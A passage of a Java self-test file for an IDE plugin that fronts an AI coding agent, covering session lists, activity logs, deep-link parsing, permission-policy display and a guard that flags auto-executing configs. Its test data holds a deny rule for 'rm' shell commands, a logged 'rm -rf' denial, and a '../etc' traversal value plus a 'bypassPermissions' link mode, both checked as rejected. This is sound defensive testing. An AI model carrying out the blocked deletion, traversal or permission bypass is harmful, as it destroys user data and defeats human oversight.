                    + "\"heartbeatAt\":1,\"transport\":{\"pipe\":\"p\",\"token\":\"t\"}}");
            java.nio.file.Files.writeString(dir.resolve("bg-x.job.1.json"), "{}");
            java.nio.file.Files.writeString(dir.resolve("broken.json"), "{nope");

            java.util.List<BackgroundAgents.Session> list = BackgroundAgents.list(dir, now);
            eq(list.size(), 3, "3 sessions (job + garbage skipped)");
            eq(list.get(0).id, "bg-new", "newest first");
            check(list.get(0).interactive, "fresh running + transport = interactive");
            eq(list.get(0).phase, "idle", "phase surfaced");
            BackgroundAgents.Session stale = list.stream()
                    .filter(s -> s.id.equals("bg-stale")).findFirst().orElse(null);
            check(stale != null && "lost".equals(stale.status), "stale heartbeat shown lost");
            check(stale != null && !stale.interactive, "lost is never interactive");
            check(stale != null && "heartbeat-stale".equals(stale.lostReason), "lost reason");

            java.util.Map<String, Integer> sum = BackgroundAgents.summarize(list);
            eq((int) sum.get("running"), 1, "running count");
            eq((int) sum.get("lost"), 1, "lost count");
            eq((int) sum.get("completed"), 1, "completed count");

            // startedAt/endedAt are epoch ms in real states (0 = absent)
            eq(BackgroundAgents.formatElapsed(1_000, 43_000, 0), "42s", "elapsed s");
            eq(BackgroundAgents.formatElapsed(1_000, 193_000, 0), "3m 12s", "elapsed m");
            eq(BackgroundAgents.formatElapsed(1_000, 3_841_000, 0), "1h 4m", "elapsed h");
            eq(BackgroundAgents.formatElapsed(1_000, 0, 43_000), "42s", "running → now");

            java.nio.file.Path log = dir.resolve("bg-new.log");
            java.nio.file.Files.writeString(log, "one\ntwo\nthree\n");
            eq(BackgroundAgents.tailLog(log.toString(), 2), "three\n", "tail last lines");
            eq(BackgroundAgents.tailLog(dir.resolve("missing.log").toString(), 5), "",
                    "missing log tolerated");

            String row = BackgroundAgents.formatRow(list.get(0), now);
            check(row.contains("running") && row.contains("work") && row.contains("⇄"),
                    "row shows status/title/interactive");
            String detail = BackgroundAgents.formatDetail(list.get(0), now, 5);
            check(detail.contains("bg-new") && detail.contains("interactive: yes"),
                    "detail block");

            for (java.io.File f : dir.toFile().listFiles()) f.delete();
            dir.toFile().delete();
        } catch (java.io.IOException e) {
            check(false, "backgroundAgents smoke IO: " + e.getMessage());
        }
    }

    private static void teamMonitor() {
        System.out.println("TeamMonitor (cc team --state parse + summarize + report)");
        String json = "{\"version\":2,\"registry\":{\"tasks\":{\"tasks\":["
                + "{\"id\":\"a\",\"title\":\"build\",\"status\":\"completed\","
                + "\"metadata\":{\"key\":\"a\",\"dependsOn\":[]}},"
                + "{\"id\":\"b\",\"title\":\"test\",\"status\":\"in_progress\","
                + "\"metadata\":{\"key\":\"b\",\"dependsOn\":[\"a\"],\"attempts\":2,"
                + "\"lease\":{\"holder\":\"mate-1\",\"expiresAt\":10000}}},"
                + "{\"id\":\"c\",\"title\":\"stalled\",\"status\":\"in_progress\","
                + "\"metadata\":{\"lease\":{\"holder\":\"mate-2\",\"expiresAt\":1000}}},"
                + "{\"id\":\"d\",\"title\":\"waiting\",\"status\":\"blocked\","
                + "\"metadata\":{\"dependsOn\":[\"b\"]}}]}}}";
        TeamMonitor.State st = TeamMonitor.parse(json);
        check(st.ok, "parse ok");
        eq(st.version, 2L, "version");
        eq(st.tasks.size(), 4, "4 tasks flattened");
        TeamMonitor.Task b = st.tasks.get(1);
        eq(b.holder, "mate-1", "lease holder from metadata");
        eq(b.attempts, 2, "attempts");
        check(b.dependsOn.size() == 1 && b.dependsOn.get(0).equals("a"), "dependsOn");

        TeamMonitor.Summary s = TeamMonitor.summarize(st, 5000L);
        eq(s.total, 4, "total");
        eq((int) s.counts.get("completed"), 1, "completed count");
        eq((int) s.counts.get("in_progress"), 2, "in_progress count");
        eq((int) s.counts.get("blocked"), 1, "blocked count");
        eq(s.active, 1, "live lease @now=5000 (mate-1)");
        eq(s.stale, 1, "expired lease @now=5000 (mate-2)");
        eq(s.donePct, 25, "1/4 done = 25%");

        String report = TeamMonitor.formatReport(st, 5000L);
        check(report.contains("25% done · 1/4 tasks"), "report header");
        check(report.contains("@mate-1"), "report shows holder");
        check(report.contains("(stale)"), "report flags stale lease");
        check(report.contains("×2"), "report shows retry count");

        // Tolerant failures
        check(!TeamMonitor.parse("{bad").ok, "bad json -> !ok");
        check(!TeamMonitor.parse("{\"hello\":1}").ok, "wrong shape -> !ok");
        check(!TeamMonitor.parse(null).ok, "null -> !ok");
        TeamMonitor.State empty = TeamMonitor.parse(
                "{\"version\":2,\"registry\":{\"tasks\":{\"tasks\":[]}}}");
        check(empty.ok, "empty task list still ok");
        eq(TeamMonitor.summarize(empty, 0L).donePct, 0, "empty -> 0% (no div-by-zero)");
    }

    private static void activityLog() {
        System.out.println("ActivityLog (bridge tool-call ring buffer + report)");
        ActivityLog log = new ActivityLog(3); // small cap to test eviction
        log.record(1000L, "tool", "getSelection", true, "");
        log.record(2000L, "tool", "openDiff", true, "…/src/a.js");
        log.record(3000L, "tool", "getDiagnostics", false, "…/src/b.js");
        ActivityLog.Counts c = log.counts();
        eq(c.tool, 3, "3 tool calls");
        eq(c.error, 1, "1 error");
        // recent = newest first
        java.util.List<ActivityLog.Entry> recent = log.recent(10);
        eq(recent.size(), 3, "recent size");
        eq(recent.get(0).tool, "getDiagnostics", "newest first");
        // ring buffer evicts the oldest past the cap (max 3)
        log.record(4000L, "tool", "getOpenEditors", true, "");
        eq(log.size(), 3, "capped at 3");
        eq(log.counts().tool, 4, "totals keep counting past the cap");
        eq(log.recent(1).get(0).tool, "getOpenEditors", "newest after eviction");
        check(log.recent(10).stream().noneMatch(e -> "getSelection".equals(e.tool)),
                "oldest evicted");

        // report: header totals + newest-first list, deterministic clock
        ActivityLog.TimeFmt fmt = ts -> "T" + ts;
        String report = log.formatReport(51234, 10, fmt);
        check(report.contains("bridge on 127.0.0.1:51234"), "report shows port");
        check(report.contains("tool calls: 4"), "report totals");
        check(report.contains("errors: 1"), "report error count");
        check(report.indexOf("getOpenEditors") < report.indexOf("openDiff"),
                "report newest-first");
        check(report.contains("✗ getDiagnostics"), "failed call marked ✗");
        // empty log + stopped bridge
        ActivityLog empty = new ActivityLog(10);
        String er = empty.formatReport(-1, 10, fmt);
        check(er.contains("bridge stopped"), "stopped bridge");
        check(er.contains("no tool calls yet"), "empty placeholder");

        // summarizeArgs: only openDiff/getDiagnostics paths shorten; others empty
        java.util.Map<String, Object> args = new java.util.HashMap<>();
        args.put("path", "/home/u/proj/src/deep/file.js");
        eq(ActivityLog.summarizeArgs("openDiff", args), "…/deep/file.js", "shorten deep path");
        eq(ActivityLog.summarizeArgs("getSelection", args), "", "non-path tool -> empty");
        eq(ActivityLog.summarizeArgs("openDiff", null), "", "null args -> empty");
        eq(ActivityLog.shortenPath("a/b"), "a/b", "short path unchanged");
    }

    private static void deepLink() {
        System.out.println("DeepLink (jetbrains:// URI parser — VS uri-handler.js twin)");
        Map<String, String> withPrompt = new LinkedHashMap<>();
        withPrompt.put("prompt", "fix the bug");
        Map<String, String> blank = new LinkedHashMap<>();
        blank.put("prompt", "   ");

        // /open with a prompt
        DeepLink.Action a = DeepLink.parse("open", withPrompt);
        check(a != null, "open parses");
        eq(a.action, "open", "open action");
        eq(a.prompt, "fix the bug", "prompt carried");

        // bare/null/blank target maps to open (VS "bare authority → open")
        eq(DeepLink.parse(null, null).action, "open", "null target -> open");
        eq(DeepLink.parse("", null).action, "open", "empty target -> open");
        eq(DeepLink.parse("/open", null).action, "open", "leading slash stripped");
        eq(DeepLink.parse("OPEN", null).action, "open", "case-insensitive");

        // no prompt / blank prompt -> null prompt (never seeds whitespace)
        check(DeepLink.parse("open", null).prompt == null, "no params -> null prompt");
        check(DeepLink.parse("open", blank).prompt == null, "blank prompt -> null");

        // unsupported action -> null (ignored, never misfires)
        check(DeepLink.parse("delete", withPrompt) == null, "unknown action -> null");
        check(DeepLink.parse("close", null) == null, "unknown close -> null");

        // extended params: session/file/line/workspace/mode (P2 #11 完整化)
        Map<String, String> full = new LinkedHashMap<>();
        full.put("session", "panel-9-x");
        full.put("file", "C:\\代码\\a b\\main.ts");
        full.put("line", "7");
        full.put("mode", "acceptEdits");
        DeepLink.Action f = DeepLink.parse("open", full);
        eq(f.session, "panel-9-x", "session carried");
        eq(f.file, "C:\\代码\\a b\\main.ts", "windows/cjk/space path verbatim");
        check(f.line == 7, "1-based line parsed");
        eq(f.mode, "acceptEdits", "safe mode carried");
        // security: an untrusted link can NEVER arm bypassPermissions
        check(!DeepLink.SAFE_MODES.contains("bypassPermissions"), "bypass not a safe mode");
        check(DeepLink.parse("open", one("mode", "bypassPermissions")).mode == null,
                "bypass mode dropped");
        // junk session id + lone line rejected
        check(DeepLink.parse("open", one("session", "../etc")).session == null,
                "junk session rejected");
        check(DeepLink.parse("open", one("line", "9")).line == 0, "lone line dropped");
    }

    private static Map<String, String> one(String k, String v) {
        Map<String, String> m = new LinkedHashMap<>();
        m.put(k, v);
        return m;
    }

    private static void remoteDoctor() {
        System.out.println("RemoteDoctor (remote/WSL doctor — VS remote-doctor.js twin)");
        check(RemoteDoctor.compareVersions("0.162.156", "0.162.155") > 0, "version gt");
        check(RemoteDoctor.compareVersions("0.162.156-alpha.1", "0.162.156") == 0,
                "prerelease tail ignored");
        RemoteDoctor.Signals ok = new RemoteDoctor.Signals();
        ok.cliFound = true; ok.cliVersion = "0.162.156"; ok.minCliVersion = "0.162.150";
        ok.bridgePort = 51234; ok.portProbe = "listening";
        eq(RemoteDoctor.analyze(ok).level, "ok", "clean local ok");
        RemoteDoctor.Signals wsl = new RemoteDoctor.Signals();
        wsl.isWsl = true; wsl.cliFound = false;
        RemoteDoctor.Result r = RemoteDoctor.analyze(wsl);
        eq(r.level, "error", "wsl + missing cli errors");
        boolean hasWslCheck = false, hasFix = false;
        for (RemoteDoctor.Check c : r.checks) {
            if (c.id.equals("wsl-networking")) hasWslCheck = true;
            if (c.id.equals("cli-missing") && "npm install -g chainlesschain".equals(c.fix)) hasFix = true;
        }
        check(hasWslCheck, "wsl networking advisory present");
        check(hasFix, "cli install fix present");
        check(r.summary.contains("Remote / WSL Doctor"), "summary header");
    }

    private static void semanticTools() {
        System.out.println("SemanticTools (PSI semantic bridge tools — pure core)");
        // 1-based position contract
        SemanticTools.Position p = SemanticTools.requirePosition(mapOf(
                "path", "src/A.java", "line", 12L, "column", 3L));
        eq(p.line, 12, "position line parsed");
        eq(p.column, 3, "position column parsed");
        boolean rejected = false;
        try { SemanticTools.requirePosition(mapOf("path", "f", "line", 0L, "column", 1L)); }
        catch (IllegalArgumentException e) { rejected = e.getMessage().contains("1-based"); }
        check(rejected, "0-based line rejected with contract in message");
        // clamp
        eq(SemanticTools.clampMax(null, 100, 200), 100, "max default");
        eq(SemanticTools.clampMax(9999L, 100, 200), 200, "max hard cap");
        // hover shaping
        Map<String, Object> hoverRaw = new LinkedHashMap<>();
        hoverRaw.put("text", "<b>int&nbsp;count</b><br/>the &lt;count&gt;");
        Map<String, Object> hover = SemanticTools.shapeHover(hoverRaw);
        eq(hover.get("text"), "int count\nthe <count>", "hover html stripped + entities");
        eq(SemanticTools.shapeHover(null).get("found"), Boolean.FALSE, "hover null degrades");
        // reference caps
        List<Map<String, Object>> refs = new ArrayList<>();
        for (int i = 0; i < 150; i++) {
            Map<String, Object> r = new LinkedHashMap<>();
            r.put("file", "f" + (i % 4) + ".java");
            refs.add(r);
        }
        Map<String, Object> shaped = SemanticTools.shapeReferences(refs, 100);
        eq(((List<?>) shaped.get("references")).size(), 100, "references capped at max");
        eq(shaped.get("total"), 150L, "references total reported");
        eq(shaped.get("truncated"), Boolean.TRUE, "references truncated flag");
        // rename preview: counts only, never a mutation
        Map<String, Object> sym = new LinkedHashMap<>();
        sym.put("name", "count");
        sym.put("file", "f0.java");
        Map<String, Object> ren = SemanticTools.shapeRenamePreview(sym, refs);
        eq(ren.get("totalOccurrences"), 151L, "rename total = refs + declaration");
        eq(ren.get("fileCount"), 4L, "rename groups per file");
        eq(ren.get("preview"), Boolean.TRUE, "rename is preview-only");
        check(String.valueOf(ren.get("note")).contains("nothing was renamed"),
                "rename note says no mutation");
        // call hierarchy degrade + caps
        Map<String, Object> ch = SemanticTools.shapeCallHierarchy(null, 25);
        check(((List<?>) ch.get("callers")).isEmpty() && ch.get("reason") != null,
                "call hierarchy null degrades with reason");
        // conditional registration (same gating pattern as terminal/preview tools)
        SemanticTools.SemanticFacade fake = new SemanticTools.SemanticFacade() {
            @Override public Map<String, Object> hover(String pa, int l, int c) { return null; }
            @Override public List<Map<String, Object>> definitions(String pa, int l, int c) { return new ArrayList<>(); }
            @Override public List<Map<String, Object>> references(String pa, int l, int c, int b) { return refs; }
            @Override public Map<String, Object> symbolInfo(String pa, int l, int c) { return sym; }
            @Override public Map<String, Object> callHierarchy(String pa, int l, int c, int b) { return null; }
            @Override public Map<String, Object> projectModel() { return null; }
        };
        EditorFacade noEditor = new EditorFacade() {
            @Override public Map<String, Object> getContextMetadata(String file, String tool) {
                return mapOf("schema", IdeContextV2.SCHEMA, "file", file, "tool", tool);
            }
            @Override public Map<String, Object> getSelection() { return null; }
            @Override public List<Map<String, Object>> getDiagnostics(String path) { return new ArrayList<>(); }
            @Override public List<Map<String, Object>> getOpenEditors() { return new ArrayList<>(); }
            @Override public Map<String, Object> openDiff(String pa, String m, String o, String t) { return null; }
        };
        check(findTool(IdeTools.build(noEditor), "getHover") == null,
                "semantic tools absent without facade");
        List<Tool> withSem = IdeTools.build(noEditor, fake);
        int present = 0;
        for (String n : new String[] { "getHover", "goToDefinition", "findReferences",
                "renamePreview", "getCallHierarchy", "getSymbolInfo", "getProjectModel" }) {
            if (findTool(withSem, n) != null) present++;
        }
        eq(present, 7, "all 7 semantic tools registered with facade");
        try {
            Object res = findTool(withSem, "renamePreview").call(mapOf(
                    "path", "f0.java", "line", 1L, "column", 1L));
            eq(((Map<?, ?>) res).get("totalOccurrences"), 151L, "renamePreview tool end-to-end");
            eq(((Map<?, ?>) ((Map<?, ?>) res).get("context")).get("schema"),
                    IdeContextV2.SCHEMA, "semantic tool carries context v2");
        } catch (Exception e) {
            check(false, "renamePreview tool call threw: " + e);
        }
    }

    private static Tool findTool(List<Tool> tools, String name) {
        for (Tool t : tools) if (t.name().equals(name)) return t;
        return null;
    }

    private static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i + 1 < kv.length; i += 2) m.put((String) kv[i], kv[i + 1]);
        return m;
    }

    private static void autoExecGuard() {
        System.out.println("AutoExecGuard (auto-exec config guard — VS auto-exec-guard.js twin)");
        eq(AutoExecGuard.classify(".mcp.json").category, "mcp-config", "mcp config");
        eq(AutoExecGuard.classify(".git/hooks/pre-commit").category, "git-hook", "git hook");
        eq(AutoExecGuard.classify(".husky/pre-push").category, "git-hook", "husky hook");
        eq(AutoExecGuard.classify(".zshrc").category, "shell-profile", "shell profile");
        eq(AutoExecGuard.classify(".vscode/tasks.json").category, "vscode-tasks", "vscode task");
        eq(AutoExecGuard.classify(".idea/runConfigurations/App.xml").category,
                "jetbrains-run-config", "jetbrains run config");
        // separator/case insensitive
        eq(AutoExecGuard.classify(".vscode\\tasks.json").category, "vscode-tasks", "backslash path");
        // not-risky
        check(AutoExecGuard.classify("src/index.ts") == null, "ordinary file not flagged");
        check(AutoExecGuard.classify(".git/hooks/pre-commit.sample") == null,
                "inert sample hook not flagged");
        // scan dedupes + sorts loudest-first
        java.util.List<AutoExecGuard.Finding> f = AutoExecGuard.scan(java.util.List.of(
                "src/a.ts", ".vscode/settings.json", ".vscode/settings.json",
                ".mcp.json", ".vscode/tasks.json"));
        check(f.size() == 3, "scan dedupes to 3");
        eq(f.get(0).category, "mcp-config", "loudest first");
        check(AutoExecGuard.summarize(f).contains("3 auto-executable"), "summary counts");
        eq(AutoExecGuard.summarize(java.util.List.of()), "", "empty summary");
    }

    /**
     * SessionsWorkbench — unified sessions workbench core (gap #3): source
     * parsing → unified rows, background↔chat dedup, waitingApproval/running
     * sort precedence, case-insensitive filter, per-kind action ids, relative
     * time and plain-text display columns.
     */
    private static void sessionsWorkbench() {
        System.out.println("SessionsWorkbench:");
        final long now = 1_800_000_000_000L;

        // Source parsing + action derivation.
        List<SessionsWorkbench.Row> chat = SessionsWorkbench.chatRows(
                "[{\"id\":\"s1\",\"title\":\"Fix bug\",\"updated_at\":\"2026-07-10 12:00:00\"}]");
        eq(chat.size(), 1, "wb chat parsed");
        eq(chat.get(0).kind, "chat", "wb chat kind");
        eq(chat.get(0).actions, Arrays.asList("resume", "rename", "delete"), "wb chat actions");
        check(chat.get(0).lastActivity > 0, "wb sqlite datetime parsed");
        eq(SessionsWorkbench.chatRows("not json {{").size(), 0, "wb malformed chat tolerated");
        eq(SessionsWorkbench.remoteRows("]]").size(), 0, "wb malformed remote tolerated");

        Map<String, Object> ideRow = new LinkedHashMap<String, Object>();
        ideRow.put("id", "s1");
        ideRow.put("workspace", "C:/repo");
        ideRow.put("status", "waiting_approval");
        ideRow.put("updatedAt", "2026-07-11T00:00:00Z");
        List<SessionsWorkbench.Row> ide =
                SessionsWorkbench.ideRows(java.util.List.of(ideRow));
        check(ide.get(0).waitingApproval, "wb waiting_approval flagged");

        // ide index row annotates the same-id chat row (title falls back).
        List<SessionsWorkbench.Row> mergedIde =
                SessionsWorkbench.aggregate(chat, ide, null, null, null);
        eq(mergedIde.size(), 1, "wb chat+ide dedup by id");
        eq(mergedIde.get(0).kind, "ide", "wb index row wins");
        eq(mergedIde.get(0).title, "Fix bug", "wb title falls back to chat");

        // Background agent referencing sessionId absorbs the chat row.
        BackgroundAgents.Session running = new BackgroundAgents.Session(
                "bg1", "running", null, null, -1, 0, "", "", "s1",
                now - 1000, 0, null, "", "\\\\.\\pipe\\x", "tok", true, null, 0);
        List<SessionsWorkbench.Row> bg =
                SessionsWorkbench.backgroundRows(java.util.List.of(running));
        eq(bg.get(0).actions, Arrays.asList("attach", "stop", "rename"),
                "wb running bg actions");
        List<SessionsWorkbench.Row> merged =
                SessionsWorkbench.aggregate(chat, null, bg, null, null);
        eq(merged.size(), 1, "wb bg absorbs its chat row");
        eq(merged.get(0).id, "bg1", "wb bg row wins");
        eq(merged.get(0).sessionId, "s1", "wb bg carries sessionId");
        eq(merged.get(0).title, "Fix bug", "wb bg inherits chat title");

        BackgroundAgents.Session done = new BackgroundAgents.Session(
                "bg2", "completed", null, null, -1, 0, "t", "", null,
                now - 9000, now - 5000, 0, "", null, null, false, null, 0);
        eq(SessionsWorkbench.backgroundRows(java.util.List.of(done)).get(0).actions,
                Arrays.asList("resume", "logs", "rename"), "wb finished bg actions");

        // Remote host rows + port extraction.
        List<SessionsWorkbench.Row> remote = SessionsWorkbench.remoteRows(
                "[{\"port\":18800,\"alive\":true,\"mode\":\"direct\","
                        + "\"agentSessionId\":\"s5\"},{\"invalid\":true}]");
        eq(remote.size(), 1, "wb invalid remote state skipped");
        eq(remote.get(0).status, "running", "wb alive → running");
        eq(remote.get(0).actions, Arrays.asList("status", "stop"), "wb remote actions");
        eq(SessionsWorkbench.remotePort("remote:18800"), 18800L, "wb remote port");
        eq(SessionsWorkbench.remotePort("s1"), 0L, "wb non-remote port 0");

        // Sort precedence: warning first, then approval, then running, then time.
        Map<String, Object> approval = new LinkedHashMap<String, Object>(ideRow);
        approval.put("id", "appr");
        approval.put("updatedAt", "2026-06-01T00:00:00Z");
        Map<String, Object> stoppedNew = new LinkedHashMap<String, Object>();
        stoppedNew.put("id", "stopped-new");
        stoppedNew.put("status", "stopped");
        stoppedNew.put("updatedAt", "2026-07-09T00:00:00Z");
        Map<String, Object> runningOld = new LinkedHashMap<String, Object>();
        runningOld.put("id", "run-old");
        runningOld.put("status", "running");
        runningOld.put("updatedAt", "2026-07-01T00:00:00Z");
        List<SessionsWorkbench.Row> sorted = SessionsWorkbench.aggregate(null,
                SessionsWorkbench.ideRows(Arrays.asList(stoppedNew, runningOld, approval)),
                null, null,
                java.util.List.of(SessionsWorkbench.warningRow("chat", "boom")));
        eq(sorted.get(0).kind, "warning", "wb warning row first");
        eq(sorted.get(1).id, "appr", "wb approval before running");
        eq(sorted.get(2).id, "run-old", "wb running before newer stopped");
        eq(sorted.get(3).id, "stopped-new", "wb then lastActivity desc");

        // Filter over title/workspace/id, case-insensitive.
        eq(SessionsWorkbench.filter(mergedIde, "REPO").size(), 1, "wb filter workspace");
        eq(SessionsWorkbench.filter(mergedIde, "s1").size(), 1, "wb filter id");
        eq(SessionsWorkbench.filter(mergedIde, "zzz").size(), 0, "wb filter miss");
        eq(SessionsWorkbench.filter(mergedIde, null).size(), 1, "wb null query keeps all");

        // Relative time.
        eq(SessionsWorkbench.formatRelativeTime(now, 0), "", "wb no time → empty");
        eq(SessionsWorkbench.formatRelativeTime(now, now - 10_000), "just now", "wb just now");
        eq(SessionsWorkbench.formatRelativeTime(now, now - 5 * 60_000L), "5m ago", "wb minutes");
        eq(SessionsWorkbench.formatRelativeTime(now, now - 3 * 3_600_000L), "3h ago", "wb hours");
        eq(SessionsWorkbench.formatRelativeTime(now, now - 2 * 86_400_000L), "2d ago", "wb days");

        // Display columns (plain text, id fallback for untitled).
        String[] cols = SessionsWorkbench.toColumns(mergedIde.get(0), now);
        eq(cols.length, SessionsWorkbench.COLUMN_COUNT, "wb column count");
        eq(cols[1], "Fix bug", "wb title column");
        check(cols[2].contains("approval"), "wb approval surfaced in status column");
    }

    /**
     * Artifacts — the artifacts drawer core (gap #9): list JSON parsing (incl.
     * malformed tolerance), newest-first shaping, kind+query filtering, human
     * size, previewability classification and per-row action derivation.
     */
    private static void artifacts() {
        System.out.println("Artifacts:");
        final long now = 1_800_000_000_000L;
        List<Artifacts.Row> rows = Artifacts.parseList(
                "{\"artifacts\":[{\"id\":\"art_a\",\"title\":\"Report\","
                        + "\"kind\":\"report\",\"mime\":\"text/markdown\",\"size\":2048,"
                        + "\"sha256\":\"abc\",\"sourcePath\":\"C:/t/r.md\","
                        + "\"file\":\"art_a.md\",\"sessionId\":\"s1\","
                        + "\"createdAt\":\"2026-07-01T00:00:00Z\","
                        + "\"expiresAt\":\"2026-07-31T00:00:00Z\"},"
                        + "{\"id\":\"art_b\",\"title\":\"Shot\",\"kind\":\"screenshot\","
                        + "\"mime\":\"image/png\",\"size\":512,\"file\":\"art_b.png\","
                        + "\"createdAt\":\"2026-07-10T00:00:00Z\"}]}");
        eq(rows.size(), 2, "art list parsed");
        eq(rows.get(0).id, "art_b", "art newest first");
        eq(rows.get(1).sessionId, "s1", "art session carried");
        eq(Artifacts.parseList("not json {{").size(), 0, "art malformed tolerated");
        eq(Artifacts.parseList("{}").size(), 0, "art missing array tolerated");
        eq(Artifacts.parseList("[{\"title\":\"no id\"}]").size(), 0, "art no-id skipped");

        eq(Artifacts.filter(rows, "", "report").size(), 1, "art kind filter");
        eq(Artifacts.filter(rows, "SHOT", null).size(), 1, "art query ci filter");
        eq(Artifacts.filter(rows, "zzz", "").size(), 0, "art filter miss");

        eq(Artifacts.formatSize(512), "512 B", "art size bytes");
        eq(Artifacts.formatSize(1536), "1.5 KB", "art size kb");
        eq(Artifacts.formatSize(5L * 1024 * 1024), "5.0 MB", "art size mb");

        eq(Artifacts.previewClass("text/markdown", "a.md"), "text", "art md text");
        eq(Artifacts.previewClass("image/png", "a.png"), "image", "art png image");
        eq(Artifacts.previewClass("text/html", "a.html"), "html", "art html");
        eq(Artifacts.previewClass("application/zip", "a.zip"), "binary", "art zip binary");
        eq(Artifacts.previewClass("application/octet-stream", "run.log"), "text",
                "art ext fallback");

        eq(Artifacts.actionsFor(rows.get(1)), Arrays.asList("openInEditor",
                "revealInFolder", "copyPath", "remove"), "art text actions");
        Artifacts.Row html = new Artifacts.Row("h", "t", "report", "text/html",
                1, "", "", "h.html", "", now, 0);
        check(Artifacts.actionsFor(html).contains("openExternal"), "art html external");
        check(!Artifacts.actionsFor(html).contains("openInEditor"), "art html no editor");

        String[] cols = Artifacts.toColumns(rows.get(1), rows.get(1).createdAt + 120_000L);
        eq(cols.length, Artifacts.COLUMN_COUNT, "art column count");
        eq(cols[2], "2.0 KB", "art size column");
        eq(cols[4], "2m ago", "art relative time column");
        check(Artifacts.describe(rows.get(1), now).contains("sha256: abc"),
                "art describe sha");
        check(Artifacts.storedPath("C:/store", rows.get(1)).endsWith("art_a.md"),
                "art stored path");
        eq(Artifacts.defaultArtifactsDir("C:/x", "C:/home"), "C:/x", "art env override");
        eq(Artifacts.buildRemoveArgs("a"), Arrays.asList("artifacts", "remove", "a", "--json"),
                "art remove args");
    }

    /**
     * PolicyViewer — the permission/policy viewer core (gap #10): payload
     * parsing (permissions list / recent denials / auto-mode config +
     * defaults), malformed → null, describe() per-source failure tolerance
     * and the counts summary line.
     */
    private static void policyViewer() {
        System.out.println("PolicyViewer:");
        final long now = 1_800_000_000_000L;
        PolicyViewer.PermissionsSection perm = PolicyViewer.parsePermissions(
                "{\"rules\":{\"allow\":[\"Read\"],\"ask\":[],\"deny\":[\"Bash(rm:*)\"]},"
                        + "\"sources\":{\"deny:Bash(rm:*)\":\".claude/settings.json\"},"
                        + "\"files\":[\".claude/settings.json\"],"
                        + "\"managed\":{\"requireSignedPlugins\":true},"
                        + "\"managedFile\":\"C:/m.json\"}");
        check(perm != null, "pv permissions parsed");
        eq(perm.count("deny"), 1, "pv deny count");
        eq(perm.rules.get(0).kind, "deny", "pv deny first");
        eq(perm.rules.get(0).source, ".claude/settings.json", "pv rule source");
        check(perm.managedFlags.contains("signed plugin manifests required"),
                "pv managed flag");
        check(PolicyViewer.parsePermissions("not json") == null, "pv malformed null");

        List<PolicyViewer.Denial> denials = PolicyViewer.parseDenials(
                "{\"denials\":[{\"at\":" + (now - 120_000L) + ",\"tool\":\"run_shell\","
                        + "\"summary\":\"rm -rf\",\"via\":\"settings-rules\","
                        + "\"rule\":\"Bash(rm:*)\",\"count\":3,"
                        + "\"permissionMode\":\"auto\"}]}");
        check(denials != null && denials.size() == 1, "pv denials parsed");
        eq(denials.get(0).count, 3L, "pv denial count");
        check(PolicyViewer.parseDenials("oops") == null, "pv denials malformed null");

        PolicyViewer.AutoModeSection auto = PolicyViewer.parseAutoMode(
                "{\"effective\":{\"classifyAllShell\":true},\"files\":[],"
                        + "\"decisions\":{\"low\":{\"decision\":\"allow\","
                        + "\"reason\":\"r\",\"source\":\"default\"},"
                        + "\"high\":{\"decision\":\"deny\",\"reason\":\"locked\","
                        + "\"source\":\"settings\"}},"
                        + "\"rules\":[{\"match\":{\"tool\":\"run_shell\"},"
                        + "\"decision\":\"ask\",\"reason\":\"eyes\"}],"
                        + "\"customized\":true}");
        check(auto != null && auto.customized, "pv auto customized");
        eq(auto.decisions.get("high").decision, "deny", "pv risk matrix");
        eq(auto.rules.get(0).match, "tool=run_shell", "pv fine rule match");
        check(PolicyViewer.parseAutoMode("{\"decisions\":[]}") == null,
                "pv auto malformed null");

        List<String> prec = PolicyViewer.parsePrecedence(
                "{\"precedence\":[\"managed-settings\",\"hooks\"]}");
        check(prec != null && prec.size() == 2, "pv precedence parsed");
        check(PolicyViewer.parsePrecedence("{}") == null, "pv precedence missing null");

        String text = PolicyViewer.describe(perm, denials, auto, prec, now);
        check(text.contains("Bash(rm:*)"), "pv describe rules");
        check(text.contains("x3"), "pv describe denial count");
        check(text.contains("2m ago"), "pv describe relative time");
        check(text.contains("[managed]"), "pv describe managed badge");
        check(text.contains("managed-settings > hooks"), "pv describe precedence");
        String degraded = PolicyViewer.describe(null, denials, null, null, now);
        check(degraded.contains("⚠ unavailable"), "pv failed source warns");
        check(degraded.contains("run_shell rm -rf"), "pv healthy section still renders");

        eq(PolicyViewer.summaryLine(perm, denials, auto),
                "permissions: 1 allow / 0 ask / 1 deny · 1 recent denials"
                        + " · auto-mode: customized (+1 fine-grained)",
                "pv summary line");
        eq(PolicyViewer.summaryLine(null, null, null),
                "permissions: n/a · denials: n/a · auto-mode: n/a",
                "pv summary n/a");
    }

    /**
     * PluginQuality — the plugin/LSP quality board core (gap #11, VS
     * plugin-quality.js twin): tolerant parsers, honest lsp verdict
     * derivation (unknown never fabricated), flag rules (lsp-only NOT
     * unused, no slow flag) and the text board render.
     */
    private static void pluginQuality() {
        System.out.println("PluginQuality (plugin/LSP quality board — VS plugin-quality.js twin)");
        eq(PluginQuality.buildPluginValidateArgs("/p"),
                Arrays.asList("plugin", "validate", "/p", "--json"), "pq validate args");
        eq(PluginQuality.buildCodeIntelStatusArgs(),
                Arrays.asList("code-intel", "status", "--json"), "pq status args");
        check(PluginQuality.parsePluginValidate("not json") == null, "pq validate unreadable null");
        PluginQuality.Validation lspOnly = PluginQuality.parsePluginValidate(
                "{\"ok\":true,\"componentCounts\":{\"lsp\":1},"
                        + "\"components\":{\"lsp\":[{\"languageId\":\"mylang\","
                        + "\"command\":\"mylang-ls\"}]}}");
        eq(lspOnly.counts.get("lsp"), 1, "pq lsp count parsed");
        eq(lspOnly.lsp.get(0).id, "mylang-ls", "pq lsp id falls back to command");
        check(PluginQuality.parseCodeIntelStatus("{}") == null, "pq status without servers null");
        List<PluginQuality.StatusServer> down = PluginQuality.parseCodeIntelStatus(
                "{\"servers\":[{\"languageId\":\"mylang\",\"id\":\"mylang-ls\","
                        + "\"available\":false}]}");
        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp, down), "unavailable",
                "pq own server down -> unavailable");
        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp, null), "unknown",
                "pq no probe -> unknown (never fabricated)");
        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp,
                Arrays.asList(new PluginQuality.StatusServer("mylang", "someone-else", true))),
                "unknown", "pq different server -> unknown");
